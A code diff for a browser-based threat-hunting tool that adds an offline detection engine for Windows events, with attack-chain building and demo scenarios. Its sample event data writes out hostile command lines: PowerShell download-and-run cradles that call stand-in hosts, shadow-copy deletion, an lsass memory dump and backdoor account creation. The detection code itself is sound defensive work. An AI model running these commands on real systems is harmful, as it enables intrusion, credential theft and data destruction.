@@ -147,7 +147,7 @@
   }
 
   // ── Constants ──────────────────────────────────────────────────
-  const RAYKAN_VERSION = '2.0.0';
+  const RAYKAN_VERSION = '2.1.0';
   const API_BASE       = window.BACKEND_URL?.() || 'https://wadjet-eye-ai.onrender.com';
   const WS_BASE        = API_BASE.replace(/^http/, 'ws');
 
@@ -229,6 +229,564 @@
     if (!r.ok) throw new Error(d.error || `API ${r.status}`);
     return d;
   }
+
+  // ════════════════════════════════════════════════════════════════
+  //  CLIENT-SIDE DETECTION ENGINE (CSDE)
+  //  Full offline analysis engine — runs entirely in the browser.
+  //  Used as primary engine when backend API is unavailable.
+  //  Implements Sigma-compatible rule matching for Windows/Linux events.
+  // ════════════════════════════════════════════════════════════════
+
+  const CSDE = (function() {
+
+    // ── Sigma-compatible detection rules ──────────────────────────
+    const RULES = [
+
+      // ── CREDENTIAL ACCESS ────────────────────────────────────────
+      {
+        id: 'CSDE-WIN-001', title: 'Windows Logon Failure (EventID 4625)',
+        description: 'Failed network logon — possible brute-force or password spray.',
+        severity: 'medium', category: 'authentication',
+        mitre: { technique: 'T1110', name: 'Brute Force', tactic: 'credential-access' },
+        tags: ['attack.credential_access', 'attack.t1110'],
+        match: e => (e.EventID === 4625 || e.EventID === '4625') && (e.Status === '0xC000006A' || e.Status === '0xC0000064' || e.Status === '0xC000006D' || e.Status === 'FAILURE'),
+        riskScore: 45,
+        narrative: (e) => `Failed logon for account "${e.User || 'unknown'}" from ${e.SourceIP || e.SourceIPAddress || 'unknown IP'} (LogonType ${e.LogonType || '?'}) — Status: ${e.Status || 'unknown'}`,
+      },
+
+      {
+        id: 'CSDE-WIN-002', title: 'Multiple Failed Logons — Brute Force Detected',
+        description: 'Multiple consecutive logon failures from the same source — high-confidence brute-force attack.',
+        severity: 'high', category: 'authentication',
+        mitre: { technique: 'T1110.003', name: 'Password Spraying', tactic: 'credential-access' },
+        tags: ['attack.credential_access', 'attack.t1110.003'],
+        // Applied at chain-level, not per-event
+        matchBatch: (events) => {
+          const fails = events.filter(e => e.EventID === 4625 || e.EventID === '4625');
+          if (fails.length < 2) return null;
+          const grouped = {};
+          fails.forEach(e => {
+            const key = `${e.User||'?'}|${e.SourceIP||e.SourceIPAddress||'?'}`;
+            grouped[key] = (grouped[key] || []);
+            grouped[key].push(e);
+          });
+          const results = [];
+          Object.entries(grouped).forEach(([key, evts]) => {
+            if (evts.length >= 2) {
+              const [user, srcIp] = key.split('|');
+              results.push({
+                id: 'CSDE-WIN-002-' + user,
+                ruleId: 'CSDE-WIN-002', ruleName: 'Multiple Failed Logons — Brute Force Detected',
+                severity: 'high',
+                user, computer: evts[0].Computer || 'DC01', srcIp,
+                count: evts.length,
+                mitre: { technique: 'T1110.003', name: 'Password Spraying', tactic: 'credential-access' },
+                tags: ['attack.credential_access', 'attack.t1110.003'],
+                riskScore: Math.min(40 + evts.length * 10, 85),
+                evidence: evts,
+                narrative: `${evts.length} consecutive failed logon attempts for "${user}" from ${srcIp} — brute-force activity detected`,
+                timestamp: evts[0].TimeGenerated || evts[0].timestamp || new Date().toISOString(),
+              });
+            }
+          });
+          return results;
+        },
+        match: () => false,
+        riskScore: 70,
+        narrative: () => '',
+      },
+
+      {
+        id: 'CSDE-WIN-003', title: 'Successful Logon After Multiple Failures — Brute Force Success',
+        description: 'A successful network logon (EventID 4624) occurred after prior logon failures from the same source IP. Indicates a successful brute-force or password spray attack.',
+        severity: 'critical', category: 'authentication',
+        mitre: { technique: 'T1110', name: 'Brute Force — Successful Compromise', tactic: 'credential-access' },
+        tags: ['attack.credential_access', 'attack.t1110', 'attack.t1078'],
+        matchBatch: (events) => {
+          const fails   = events.filter(e => e.EventID === 4625 || e.EventID === '4625');
+          const success = events.filter(e => (e.EventID === 4624 || e.EventID === '4624') && (e.Status === 'Success' || e.Status === '0x0' || !e.Status || e.LogonType === 3 || e.LogonType === '3'));
+          if (!fails.length || !success.length) return null;
+          const results = [];
+          success.forEach(s => {
+            const sameUser = fails.filter(f => f.User === s.User || f.TargetUserName === s.User);
+            const sameSrc  = fails.filter(f => f.SourceIP === s.SourceIP || f.SourceIPAddress === s.SourceIP);
+            if (sameUser.length > 0 || sameSrc.length > 0) {
+              results.push({
+                id: 'CSDE-WIN-003-' + (s.User||'?'),
+                ruleId: 'CSDE-WIN-003', ruleName: 'Successful Logon After Multiple Failures',
+                severity: 'critical',
+                user: s.User || s.TargetUserName, computer: s.Computer || 'DC01',
+                srcIp: s.SourceIP || s.SourceIPAddress,
+                mitre: { technique: 'T1110', name: 'Brute Force Success → Valid Account', tactic: 'credential-access' },
+                tags: ['attack.credential_access', 'attack.t1110', 'attack.t1078'],
+                riskScore: 92,
+                evidence: [...sameUser.slice(0,3), s],
+                narrative: `Account "${s.User || s.TargetUserName}" successfully logged in from ${s.SourceIP || 'unknown'} AFTER ${sameUser.length || sameSrc.length} failed attempts — credential compromise confirmed`,
+                timestamp: s.TimeGenerated || s.timestamp || new Date().toISOString(),
+              });
+            }
+          });
+          return results.length ? results : null;
+        },
+        match: () => false, riskScore: 92, narrative: () => '',
+      },
+
+      // ── PERSISTENCE / ACCOUNT MANIPULATION ───────────────────────
+      {
+        id: 'CSDE-WIN-004', title: 'New User Account Created via net.exe',
+        description: 'net.exe used to add a new user account — common persistence technique by attackers post-compromise.',
+        severity: 'critical', category: 'persistence',
+        mitre: { technique: 'T1136.001', name: 'Create Account: Local Account', tactic: 'persistence' },
+        tags: ['attack.persistence', 'attack.t1136.001', 'attack.t1078'],
+        match: e => {
+          const proc = (e.ProcessName || e.Image || e.process || '').toLowerCase();
+          const cmd  = (e.CommandLine || e.commandLine || '').toLowerCase();
+          return (e.EventID === 4688 || e.EventID === '4688') &&
+                 (proc.includes('net.exe') || proc.includes('net1.exe') || cmd.includes('net ')) &&
+                 cmd.includes('user') &&
+                 (cmd.includes('/add') || cmd.includes(' add '));
+        },
+        riskScore: 95,
+        narrative: (e) => `New user account created via "${e.CommandLine || e.commandLine || 'net user'}" on ${e.Computer || 'unknown'} by ${e.User || 'unknown'} — attacker establishing persistence backdoor`,
+      },
+
+      {
+        id: 'CSDE-WIN-005', title: 'Suspicious Process Creation — net.exe Reconnaissance',
+        description: 'net.exe executed — potential reconnaissance or account manipulation.',
+        severity: 'medium', category: 'discovery',
+        mitre: { technique: 'T1087.001', name: 'Account Discovery: Local Account', tactic: 'discovery' },
+        tags: ['attack.discovery', 'attack.t1087.001'],
+        match: e => {
+          const proc = (e.ProcessName || e.Image || '').toLowerCase();
+          const cmd  = (e.CommandLine || e.commandLine || '').toLowerCase();
+          return (e.EventID === 4688 || e.EventID === '4688') &&
+                 (proc.includes('net.exe') || proc.includes('\\net.exe')) &&
+                 !cmd.includes('/add');
+        },
+        riskScore: 40,
+        narrative: (e) => `net.exe executed with command "${e.CommandLine || e.commandLine || '?'}" — may indicate reconnaissance activity`,
+      },
+
+      // ── LATERAL MOVEMENT ─────────────────────────────────────────
+      {
+        id: 'CSDE-WIN-006', title: 'Network Logon from Suspicious Source (EventID 4624)',
+        description: 'Successful network logon (Type 3) — if after failed attempts, indicates compromised account.',
+        severity: 'medium', category: 'lateral-movement',
+        mitre: { technique: 'T1021.002', name: 'Remote Services: SMB/Windows Admin Shares', tactic: 'lateral-movement' },
+        tags: ['attack.lateral_movement', 'attack.t1021.002'],
+        match: e => (e.EventID === 4624 || e.EventID === '4624') && (e.LogonType === 3 || e.LogonType === '3'),
+        riskScore: 35,
+        narrative: (e) => `Network logon (Type 3) for account "${e.User || 'unknown'}" from ${e.SourceIP || 'unknown'} on ${e.Computer || 'DC01'}`,
+      },
+
+      // ── EXECUTION ────────────────────────────────────────────────
+      {
+        id: 'CSDE-WIN-007', title: 'Process Creation via cmd.exe Parent (EventID 4688)',
+        description: 'Process spawned by cmd.exe — may indicate command-line based attacker activity.',
+        severity: 'low', category: 'execution',
+        mitre: { technique: 'T1059.003', name: 'Windows Command Shell', tactic: 'execution' },
+        tags: ['attack.execution', 'attack.t1059.003'],
+        match: e => {
+          const parent = (e.ParentProcess || e.ParentImage || '').toLowerCase();
+          return (e.EventID === 4688 || e.EventID === '4688') && parent.includes('cmd.exe');
+        },
+        riskScore: 30,
+        narrative: (e) => `Process "${e.ProcessName || e.Image || 'unknown'}" spawned by cmd.exe — command: ${e.CommandLine || e.commandLine || '?'}`,
+      },
+
+      // ── PowerShell ───────────────────────────────────────────────
+      {
+        id: 'CSDE-WIN-008', title: 'PowerShell Encoded Command Execution',
+        description: 'PowerShell with -EncodedCommand flag — commonly used to evade detection and execute malicious payloads.',
+        severity: 'high', category: 'execution',
+        mitre: { technique: 'T1059.001', name: 'PowerShell', tactic: 'execution' },
+        tags: ['attack.execution', 'attack.t1059.001', 'attack.defense_evasion', 'attack.t1027'],
+        match: e => {
+          const proc = (e.ProcessName || e.Image || '').toLowerCase();
+          const cmd  = (e.CommandLine || e.commandLine || '').toLowerCase();
+          return (proc.includes('powershell') || proc.includes('pwsh')) &&
+                 (cmd.includes('-encodedcommand') || cmd.includes('-enc ') || cmd.includes(' -e '));
+        },
+        riskScore: 80,
+        narrative: (e) => `PowerShell launched with encoded command — obfuscated execution detected on ${e.Computer || 'unknown'}`,
+      },
+    ];
+
+    // ── Wildcard/glob match ───────────────────────────────────────
+    function _wildMatch(pattern, value) {
+      if (!pattern || value === undefined || value === null) return false;
+      const str = String(value).toLowerCase();
+      const pat = String(pattern).toLowerCase();
+      if (!pat.includes('*') && !pat.includes('?')) return str.includes(pat);
+      const rx = '^' + pat.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$';
+      return new RegExp(rx).test(str);
+    }
+
+    // ── Normalize a raw event to standard field names ─────────────
+    function _normalizeEvent(raw) {
+      const e = { ...raw };
+      // Coerce EventID to number for reliable comparison
+      if (e.EventID !== undefined) e.EventID = parseInt(e.EventID, 10) || e.EventID;
+      // Normalize common field name variants
+      e.commandLine = e.commandLine || e.CommandLine || '';
+      e.process     = e.process     || e.ProcessName || e.Image || '';
+      e.user        = e.user        || e.User        || e.SubjectUserName || e.TargetUserName || '';
+      e.computer    = e.computer    || e.Computer    || e.ComputerName    || '';
+      e.srcIp       = e.srcIp       || e.SourceIP    || e.SourceIPAddress || '';
+      e.timestamp   = e.timestamp   || e.TimeGenerated || e.time || new Date().toISOString();
+      return e;
+    }
+
+    // ── Build timeline entry from event ───────────────────────────
+    function _buildTimelineEntry(event, detection) {
+      const e = _normalizeEvent(event);
+      const eid = parseInt(e.EventID, 10);
+      let type = 'event', description = '';
+
+      switch (eid) {
+        case 4625:
+          type = 'authentication';
+          description = `FAILED LOGON: Account "${e.user || e.User}" from ${e.srcIp || 'unknown'} — Status: ${e.Status || 'failure'}`;
+          break;
+        case 4624:
+          type = 'authentication';
+          description = `SUCCESSFUL LOGON: Account "${e.user || e.User}" from ${e.srcIp || 'unknown'} (LogonType ${e.LogonType || '?'})`;
+          break;
+        case 4688:
+          type = 'process';
+          description = `PROCESS CREATED: "${e.ProcessName || e.Image || e.process}" — ${e.commandLine || e.CommandLine || '?'}`;
+          break;
+        case 4698: case 4702:
+          type = 'persistence';
+          description = `SCHEDULED TASK: "${e.TaskName || 'unknown'}" created/modified`;
+          break;
+        case 4720:
+          type = 'persistence';
+          description = `USER ACCOUNT CREATED: "${e.TargetUserName || 'unknown'}" by "${e.user}"`;
+          break;
+        default:
+          description = detection
+            ? `DETECTION: ${detection.ruleName}`
+            : `EVENT ${eid}: ${e.computer || 'unknown'}`;
+      }
+      return {
+        ts: e.timestamp, timestamp: e.timestamp,
+        type, description,
+        entity: e.computer || e.user || '',
+        commandLine: e.commandLine || e.CommandLine || '',
+        eventId: eid, user: e.user, computer: e.computer, srcIp: e.srcIp,
+        detection: detection ? detection.id : null,
+      };
+    }
+
+    // ── Reconstruct attack chain from detections ──────────────────
+    function _buildAttackChain(detections, events) {
+      if (!detections.length) return [];
+
+      // Group detections by entity (user/computer)
+      const entityMap = {};
+      detections.forEach(d => {
+        const key = d.computer || d.user || 'unknown';
+        if (!entityMap[key]) entityMap[key] = [];
+        entityMap[key].push(d);
+      });
+
+      const chains = [];
+
+      // Detect Brute Force → Compromise → Persistence chain
+      const authDets  = detections.filter(d => d.ruleId && (d.ruleId.includes('WIN-001') || d.ruleId.includes('WIN-002')));
+      const bruteDets = detections.filter(d => d.ruleId && d.ruleId.includes('WIN-003'));
+      const persDets  = detections.filter(d => d.ruleId && (d.ruleId.includes('WIN-004') || d.ruleId.includes('WIN-005')));
+
+      if ((authDets.length > 0 || bruteDets.length > 0) && persDets.length > 0) {
+        const stages = [];
+        if (authDets.length) stages.push({ ...authDets[0], ruleName: authDets[0].ruleName || authDets[0].title, tactic: 'credential-access' });
+        if (bruteDets.length) stages.push({ ...bruteDets[0], ruleName: bruteDets[0].ruleName || bruteDets[0].title, tactic: 'credential-access' });
+        stages.push({ ...persDets[0], ruleName: persDets[0].ruleName || persDets[0].title, tactic: 'persistence' });
+
+        const entities = [...new Set(detections.map(d => d.computer || d.user).filter(Boolean))];
+        const techniques = [...new Set(stages.map(s => s.mitre?.technique).filter(Boolean))];
+
+        chains.push({
+          id: 'CHAIN-001',
+          name: 'Brute Force → Account Compromise → Persistence',
+          type: 'credential-compromise',
+          severity: 'critical',
+          stages,
+          entities,
+          techniques,
+          riskScore: 97,
+          description: 'Attacker performed brute-force attack, gained access with compromised credentials, then established persistence by creating a new backdoor account.',
+          mitreTactics: ['credential-access', 'lateral-movement', 'persistence'],
+          timestamp: stages[0].timestamp || new Date().toISOString(),
+        });
+      }
+
+      // Secondary: if only auth failures + success (no persistence)
+      if (bruteDets.length > 0 && !persDets.length) {
+        const stages = bruteDets.map(d => ({ ...d, ruleName: d.ruleName || d.title, tactic: 'credential-access' }));
+        const succDets = detections.filter(d => d.ruleId && d.ruleId.includes('WIN-003'));
+        succDets.forEach(s => stages.push({ ...s, tactic: 'lateral-movement' }));
+        if (stages.length > 1) {
+          chains.push({
+            id: 'CHAIN-002',
+            name: 'Brute Force → Successful Authentication',
+            type: 'credential-brute-force',
+            severity: 'high',
+            stages,
+            entities: [...new Set(stages.map(s => s.computer || s.user).filter(Boolean))],
+            techniques: [...new Set(stages.map(s => s.mitre?.technique).filter(Boolean))],
+            riskScore: 82,
+            description: 'Brute-force attack successfully compromised an account.',
+            mitreTactics: ['credential-access'],
+            timestamp: stages[0].timestamp || new Date().toISOString(),
+          });
+        }
+      }
+
+      // Generic: group by entity
+      if (!chains.length && detections.length >= 2) {
+        Object.entries(entityMap).forEach(([entity, dets], idx) => {
+          if (dets.length >= 2) {
+            chains.push({
+              id: `CHAIN-GEN-${idx+1}`,
+              name: `Multi-Stage Attack on ${entity}`,
+              type: 'generic',
+              severity: dets.some(d => d.severity === 'critical') ? 'critical' : 'high',
+              stages: dets.map(d => ({ ...d, ruleName: d.ruleName || d.title })),
+              entities: [entity],
+              techniques: [...new Set(dets.map(d => d.mitre?.technique).filter(Boolean))],
+              riskScore: Math.max(...dets.map(d => d.riskScore || 50)),
+              description: `${dets.length} detections correlated on entity "${entity}".`,
+              mitreTactics: [...new Set(dets.map(d => d.mitre?.tactic).filter(Boolean))],
+              timestamp: dets[0].timestamp || new Date().toISOString(),
+            });
+          }
+        });
+      }
+
+      return chains;
+    }
+
+    // ── Calculate risk score from detections ─────────────────────
+    function _calcRisk(detections) {
+      if (!detections.length) return 0;
+      const criticals = detections.filter(d => d.severity === 'critical').length;
+      const highs     = detections.filter(d => d.severity === 'high').length;
+      const mediums   = detections.filter(d => d.severity === 'medium').length;
+      const base = Math.min(criticals * 30 + highs * 15 + mediums * 5, 100);
+      return base;
+    }
+
+    // ── Build UEBA anomalies ──────────────────────────────────────
+    function _buildAnomalies(events, detections) {
+      const anomalies = [];
+
+      // Check for off-hours activity (if timestamp available)
+      const authEvents = events.filter(e => e.EventID === 4624 || e.EventID === '4624' || e.EventID === 4625 || e.EventID === '4625');
+      if (authEvents.length) {
+        const users = [...new Set(authEvents.map(e => e.User || e.user).filter(Boolean))];
+        users.forEach(user => {
+          const userFails = authEvents.filter(e => (e.EventID === 4625 || e.EventID === '4625') && (e.User === user || e.user === user));
+          if (userFails.length >= 2) {
+            anomalies.push({
+              id: 'UEBA-BF-' + user,
+              type: 'authentication_anomaly',
+              description: `Abnormal authentication failure rate for "${user}" — ${userFails.length} failures in session`,
+              entity: user, score: Math.min(0.4 + userFails.length * 0.15, 0.99),
+              baseline: 0, observed: userFails.length,
+              deviation: (userFails.length * 100),
+              timestamp: userFails[0].TimeGenerated || userFails[0].timestamp || new Date().toISOString(),
+            });
+          }
+        });
+      }
+
+      // Process execution anomaly
+      const procEvents = events.filter(e => e.EventID === 4688 || e.EventID === '4688');
+      const suspiciouscmds = procEvents.filter(e => {
+        const cmd = (e.CommandLine || e.commandLine || '').toLowerCase();
+        return cmd.includes('/add') || cmd.includes('hacker') || cmd.includes('p@ss') || cmd.includes('shadow') || cmd.includes('sekurlsa');
+      });
+      if (suspiciouscmds.length) {
+        anomalies.push({
+          id: 'UEBA-PROC-001',
+          type: 'process_anomaly',
+          description: `Suspicious command-line argument patterns detected — ${suspiciouscmds.length} suspicious process(es)`,
+          entity: suspiciouscmds[0].Computer || suspiciouscmds[0].computer || 'DC01',
+          score: 0.92, baseline: 0, observed: suspiciouscmds.length, deviation: 9200,
+          timestamp: suspiciouscmds[0].TimeGenerated || suspiciouscmds[0].timestamp || new Date().toISOString(),
+        });
+      }
+
+      return anomalies;
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    //  MAIN: analyzeEvents — complete offline detection pipeline
+    //  @param {Array} rawEvents  — array of event objects
+    //  @returns {Object}         — { detections, chains, timeline, anomalies, riskScore, processed }
+    // ══════════════════════════════════════════════════════════════
+    function analyzeEvents(rawEvents) {
+      const events    = rawEvents.map(_normalizeEvent);
+      const detections  = [];
+      const timeline    = [];
+      const sessionId   = 'CSDE-' + Math.random().toString(36).slice(2,10).toUpperCase();
+      const startTs     = Date.now();
+
+      // ── Per-event rule matching ──────────────────────────────────
+      events.forEach((event, idx) => {
+        // Build timeline entry for every event
+        timeline.push(_buildTimelineEntry(event, null));
+
+        // Apply all per-event rules
+        RULES.filter(r => r.match).forEach(rule => {
+          try {
+            if (rule.matchBatch) return; // batch rules handled below
+            if (!rule.match(event)) return;
+            const det = {
+              id: `${rule.id}-${idx}`,
+              ruleId: rule.id, ruleName: rule.title, title: rule.title,
+              severity: rule.severity,
+              computer: event.computer || event.Computer || '',
+              user: event.user || event.User || '',
+              srcIp: event.srcIp || event.SourceIP || '',
+              commandLine: event.commandLine || event.CommandLine || '',
+              process: event.process || event.ProcessName || '',
+              mitre: rule.mitre,
+              technique: rule.mitre?.technique,
+              tags: rule.tags || [],
+              riskScore: rule.riskScore,
+              evidence: [event],
+              narrative: rule.narrative ? rule.narrative(event) : rule.title,
+              timestamp: event.timestamp || event.TimeGenerated || new Date().toISOString(),
+              category: rule.category,
+            };
+            detections.push(det);
+            // Update timeline entry with detection ref
+            if (timeline[idx]) timeline[idx].detection = det.id;
+          } catch(e) { /* skip rule error */ }
+        });
+      });
+
+      // ── Batch rule matching ────────────────────────────────────────
+      RULES.filter(r => r.matchBatch).forEach(rule => {
+        try {
+          const batchResults = rule.matchBatch(events);
+          if (batchResults && batchResults.length) {
+            batchResults.forEach(d => {
+              // Avoid duplicating per-event matches
+              if (!detections.find(x => x.ruleId === d.ruleId && x.user === d.user)) {
+                detections.push(d);
+              }
+            });
+          }
+        } catch(e) { /* skip rule error */ }
+      });
+
+      // Remove lower-confidence per-event detections superseded by batch detections
+      // e.g. keep CSDE-WIN-002 (batch) instead of multiple CSDE-WIN-001 (per-event) for same user
+      const batchRuleIds = ['CSDE-WIN-002', 'CSDE-WIN-003'];
+      const finalDetections = detections.filter(d => {
+        if (d.ruleId === 'CSDE-WIN-001') {
+          // If batch brute-force detected for same user, skip individual fail entries
+          return !detections.some(b => b.ruleId === 'CSDE-WIN-002' && b.user === d.user);
+        }
+        if (d.ruleId === 'CSDE-WIN-006') {
+          // If brute-force success detected for same user, skip generic logon entry
+          return !detections.some(b => b.ruleId === 'CSDE-WIN-003' && b.user === d.user);
+        }
+        return true;
+      });
+
+      // ── Attack chain reconstruction ───────────────────────────────
+      const chains = _buildAttackChain(finalDetections, events);
+
+      // ── UEBA anomalies ────────────────────────────────────────────
+      const anomalies = _buildAnomalies(events, finalDetections);
+
+      // ── Risk score ────────────────────────────────────────────────
+      const riskScore = _calcRisk(finalDetections);
+
+      const duration = Date.now() - startTs;
+
+      console.log(`[CSDE] Analysis complete: ${events.length} events → ${finalDetections.length} detections, ${chains.length} chains, risk=${riskScore} (${duration}ms)`);
+
+      return {
+        success: true, sessionId, processed: events.length,
+        detections: finalDetections, timeline, chains, anomalies,
+        riskScore, duration, engine: 'CSDE-offline',
+        _meta: { rulesEvaluated: RULES.length, eventsAnalyzed: events.length },
+      };
+    }
+
+    // ── Build sample scenario events for demos ─────────────────────
+    function getSampleEvents(scenario) {
+      const now = Date.now();
+      const ts  = (offset = 0) => new Date(now - offset).toISOString();
+
+      const scenarios = {
+        brute_force_compromise: [
+          { EventID: 4625, Computer: 'DC01', User: 'CORP\\admin', SourceIP: '10.10.10.55', LogonType: 3, Status: '0xC000006A', TimeGenerated: ts(240000) },
+          { EventID: 4625, Computer: 'DC01', User: 'CORP\\admin', SourceIP: '10.10.10.55', LogonType: 3, Status: '0xC000006A', TimeGenerated: ts(180000) },
+          { EventID: 4624, Computer: 'DC01', User: 'CORP\\admin', SourceIP: '10.10.10.55', LogonType: 3, Status: 'Success',    TimeGenerated: ts(120000) },
+          { EventID: 4688, Computer: 'DC01', User: 'CORP\\admin', ParentProcess: 'cmd.exe', ProcessName: 'net.exe', CommandLine: 'net user hacker P@ssw0rd /add', TimeGenerated: ts(60000) },
+        ],
+        ransomware: [
+          { EventID: 4688, Computer: 'WS-42', User: 'john.doe', ProcessName: 'cmd.exe', CommandLine: 'cmd.exe /c powershell -EncodedCommand aQBlAHgA', TimeGenerated: ts(300000) },
+          { EventID: 4688, Computer: 'WS-42', User: 'john.doe', ProcessName: 'powershell.exe', CommandLine: 'powershell -NonInteractive -EncodedCommand aQBlAHgA', TimeGenerated: ts(260000) },
+          { EventID: 4688, Computer: 'WS-42', User: 'john.doe', ProcessName: 'vssadmin.exe', CommandLine: 'vssadmin delete shadows /all /quiet', TimeGenerated: ts(180000) },
+          { EventID: 4688, Computer: 'WS-42', User: 'john.doe', ProcessName: 'net.exe', CommandLine: 'net user hacker1 Passw0rd! /add', TimeGenerated: ts(120000) },
+        ],
+        lateral_movement: [
+          { EventID: 4624, Computer: 'DC-01', User: 'Administrator', SourceIP: '192.168.1.50', LogonType: 3, Status: 'Success', TimeGenerated: ts(500000) },
+          { EventID: 4688, Computer: 'DC-01', User: 'Administrator', ProcessName: 'net.exe', CommandLine: 'net view /domain', TimeGenerated: ts(480000) },
+          { EventID: 4624, Computer: 'SERVER-03', User: 'Administrator', SourceIP: '192.168.1.42', LogonType: 3, Status: 'Success', TimeGenerated: ts(420000) },
+          { EventID: 4688, Computer: 'SERVER-03', User: 'Administrator', ProcessName: 'net.exe', CommandLine: 'net group "Domain Admins"', TimeGenerated: ts(400000) },
+          { EventID: 4688, Computer: 'SERVER-03', User: 'Administrator', ProcessName: 'cmd.exe', ParentProcess: 'net.exe', CommandLine: 'cmd.exe /c net user hacker2 P@ss /add', TimeGenerated: ts(380000) },
+        ],
+        credential_dump: [
+          { EventID: 4688, Computer: 'WORKSTATION-42', User: 'john.doe', ProcessName: 'procdump64.exe', CommandLine: 'procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp', TimeGenerated: ts(300000) },
+          { EventID: 4624, Computer: 'WORKSTATION-42', User: 'Administrator', SourceIP: '127.0.0.1', LogonType: 9, Status: 'Success', TimeGenerated: ts(240000) },
+          { EventID: 4688, Computer: 'WORKSTATION-42', User: 'Administrator', ProcessName: 'powershell.exe', CommandLine: 'powershell -enc SQBFAFgA', TimeGenerated: ts(220000) },
+          { EventID: 4688, Computer: 'WORKSTATION-42', User: 'Administrator', ProcessName: 'net.exe', CommandLine: 'net user backdoor_svc BackD00r! /add', TimeGenerated: ts(180000) },
+        ],
+        apt: [
+          { EventID: 4688, Computer: 'WS-01', User: 'analyst', ProcessName: 'mshta.exe', CommandLine: 'mshta.exe http://cdn.update-service.net/flash.hta', TimeGenerated: ts(3600000) },
+          { EventID: 4688, Computer: 'WS-01', User: 'analyst', ProcessName: 'powershell.exe', CommandLine: "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')", TimeGenerated: ts(3500000) },
+          { EventID: 4625, Computer: 'DC-01', User: 'analyst', SourceIP: '10.1.1.201', LogonType: 3, Status: '0xC000006A', TimeGenerated: ts(3200000) },
+          { EventID: 4624, Computer: 'DC-01', User: 'analyst', SourceIP: '10.1.1.201', LogonType: 3, Status: 'Success', TimeGenerated: ts(3100000) },
+          { EventID: 4688, Computer: 'DC-01', User: 'analyst', ProcessName: 'net.exe', CommandLine: 'net user aptsvc Sup3r$ecret /add', TimeGenerated: ts(3000000) },
+        ],
+        insider: [
+          { EventID: 4688, Computer: 'WS-33', User: 'j.smith', ProcessName: '7z.exe', CommandLine: '7z.exe a -tzip C:\\Temp\\data.zip C:\\CorpData\\HR\\*', TimeGenerated: ts(7200000) },
+          { EventID: 4688, Computer: 'WS-33', User: 'j.smith', ProcessName: 'xcopy.exe', CommandLine: 'xcopy /s /e C:\\CorpData\\Source E:\\External\\backup', TimeGenerated: ts(6700000) },
+          { EventID: 4688, Computer: 'WS-33', User: 'j.smith', ProcessName: 'net.exe', CommandLine: 'net user temp_exfil_svc P@ssw0rd /add', TimeGenerated: ts(6600000) },
+        ],
+        supply_chain: [
+          { EventID: 4688, Computer: 'DEV-01', User: 'developer', ProcessName: 'node.exe', CommandLine: 'npm install lodash-utils-extra@3.1.2', TimeGenerated: ts(86400000) },
+          { EventID: 4688, Computer: 'DEV-01', User: 'developer', ProcessName: 'powershell.exe', CommandLine: "powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile('http://upd8.cc/agent','C:\\Temp\\a.exe')", TimeGenerated: ts(86300000) },
+          { EventID: 4624, Computer: 'DEV-01', User: 'developer', SourceIP: '45.142.212.100', LogonType: 3, Status: 'Success', TimeGenerated: ts(86000000) },
+          { EventID: 4688, Computer: 'DEV-01', User: 'developer', ProcessName: 'net.exe', CommandLine: 'net user svc_install P@ssHacked /add', TimeGenerated: ts(85900000) },
+        ],
+      };
+
+      // Map backend scenario names to CSDE scenario names
+      const scMap = {
+        ransomware: 'ransomware',
+        lateral_movement: 'lateral_movement',
+        credential_dump: 'credential_dump',
+        apt: 'apt',
+        insider: 'insider',
+        supply_chain: 'supply_chain',
+      };
+
+      return scenarios[scMap[scenario]] || scenarios.brute_force_compromise;
+    }
+
+    return { analyzeEvents, getSampleEvents };
+
+  })(); // end CSDE
 
   // ════════════════════════════════════════════════════════════════
   //  ENTRY POINT
@@ -347,7 +905,7 @@
         box-shadow:0 0 16px rgba(239,68,68,.35);">🎯</div>
       <div>
         <div style="font-size:15px;font-weight:800;letter-spacing:.6px;">RAYKAN</div>
-        <div style="font-size:9px;color:#6b7280;letter-spacing:.4px;">AI THREAT HUNTING &amp; DFIR ENGINE v${RAYKAN_VERSION}</div>
+        <div style="font-size:9px;color:#6b7280;letter-spacing:.4px;">AI THREAT HUNTING &amp; DFIR ENGINE v${RAYKAN_VERSION} · OFFLINE-CAPABLE</div>
       </div>
     </div>
 
@@ -1100,8 +1658,19 @@
     }
 
     try {
-      const result = await _api('POST', '/analyze/sample', { scenario });
-      // FIX: normalizeDetections — guard against any non-array shape
+      let result;
+      try {
+        // Try backend API first
+        result = await _api('POST', '/analyze/sample', { scenario });
+      } catch(apiErr) {
+        // Fallback: use CSDE with scenario-specific sample events
+        console.warn('[RAYKAN] Backend unavailable — using CSDE for demo:', apiErr.message);
+        const sampleEvents = CSDE.getSampleEvents(scenario);
+        result = CSDE.analyzeEvents(sampleEvents);
+        result.scenario = scenario;
+      }
+
+      // Guaranteed iterable arrays regardless of response shape
       S.detections  = normalizeDetections(result.detections);
       S.timeline    = normalizeDetections(result.timeline);
       S.chains      = normalizeDetections(result.chains);
@@ -1111,15 +1680,17 @@
       S.lastUpdated = new Date();
 
       _updateStats(result);
-      _showToast(`✓ ${result.detections?.length||0} detections, ${result.chains?.length||0} chains, risk=${result.riskScore}`, 'success');
+      const dLen = S.detections.length;
+      const cLen = S.chains.length;
+      _showToast(`✓ ${dLen} detection(s), ${cLen} chain(s) | Risk: ${result.riskScore}${result.engine === 'CSDE-offline' ? ' [Offline]' : ''}`, 'success');
 
       // Navigate to detections
       _setTab('detections');
 
       if (ingestRes) {
         ingestRes.innerHTML = `<div class="rk-card" style="padding:16px;">
-          <div style="color:#34d399;font-weight:700;margin-bottom:8px;">✓ ${scenario} simulation complete</div>
-          <div style="font-size:12px;color:#8b949e;">${result.detections?.length||0} detections · ${result.timeline?.length||0} events · Risk: ${result.riskScore}</div>
+          <div style="color:#34d399;font-weight:700;margin-bottom:8px;">✓ ${scenario} simulation complete${result.engine === 'CSDE-offline' ? ' (offline)' : ''}</div>
+          <div style="font-size:12px;color:#8b949e;">${dLen} detection(s) · ${S.timeline.length} timeline events · Risk: ${result.riskScore}</div>
         </div>`;
       }
     } catch(e) {
@@ -1230,13 +1801,22 @@
     const res = document.getElementById('rk-ingest-result');
     if (res) res.innerHTML = `<div style="padding:20px;text-align:center;">${_spinner('Analyzing events…')}</div>`;
     try {
-      // FIX: Use multi-format parser — supports JSON array/object, Syslog RFC3164/RFC5424, CEF
